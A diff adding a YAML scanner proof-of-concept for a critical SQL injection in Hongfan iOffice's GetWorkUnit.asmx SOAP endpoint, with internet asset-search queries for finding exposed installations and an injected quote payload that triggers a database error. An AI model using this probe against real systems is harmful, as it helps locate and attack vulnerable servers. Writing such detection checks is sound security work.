@@ -1,0 +1,55 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="红帆-ioffice"
+    hunter-query: app.name=="红帆 iOffice"
+    quake-query: app:"ioffice红帆OA协同办公系统"  
+    zoomeye-query: app:"红帆 ioffice"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: mssql  报错注入 联合注入
+    
+name: poc-yaml-hongfan-ioffice-GetWorkUnit.asmx-sqli
+transport: http
+set:
+  s1: randomInt(10000,99999)
+  s2: randomLowercase(8)
+
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /ioffice/prg/interface/GetWorkUnit.asmx
+      follow_redirects: false
+      headers:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: text/xml; charset=utf-8 
+        SOAPAction: http://tempuri.org/GetDutyDetail
+      body: |
+        <?xml version="1.0" encoding="utf-8"?> 
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> 
+        <soap:Body> 
+        <GetDutyDetail xmlns="http://tempuri.org/"> 
+        <DepCode>*'</DepCode> 
+        <DutyDate>string</DutyDate> 
+        <DutyName>string</DutyName> 
+        </GetDutyDetail> 
+        </soap:Body> 
+        </soap:Envelope>
+    expression: >-
+      response.status == 500 && response.body_string.contains("SqlException") && response.body_string.contains("语法错误")
+
+    output:
+      search: |-
+        "ASP.NET_SessionId=(?<token>\\w*)".bsubmatch(response.raw_header)
+      token: search["token"]
+
+expression: r0()  
